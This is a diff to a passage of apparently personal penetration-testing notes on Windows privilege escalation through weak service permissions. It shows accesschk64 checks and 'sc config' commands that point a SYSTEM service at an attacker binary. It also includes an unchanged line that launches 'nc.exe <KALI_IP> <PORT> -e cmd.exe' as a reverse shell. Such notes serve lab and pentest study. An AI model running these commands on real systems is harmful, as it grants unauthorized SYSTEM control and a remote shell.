@@ -403,9 +403,23 @@ Check if we have privileges over that process. If so, you can change the binary 
 
 ```
 Use accesschk64 (https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)
-.\accesschk64.exe /accepteula -uwcqv <service_name>
+.\accesschk64.exe /accepteula -uwcqv <username ><service_name>
 sc config <service_name> binPath="nc.exe <KALI_IP> <PORT> -e C:\Windows\system32\cmd.exe"
 sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
+```
+
+Note that the "user" account has the permission to change the service config (SERVICE_CHANGE_CONFIG).
+
+Query the service and note that it runs with SYSTEM privileges (SERVICE_START_NAME):
+
+```
+sc qc daclsvc
+```
+
+Modify the service config and set the BINARY_PATH_NAME (binpath) to the reverse.exe executable you created:
+```
+sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
+net start daclsvc
 ```
 
 
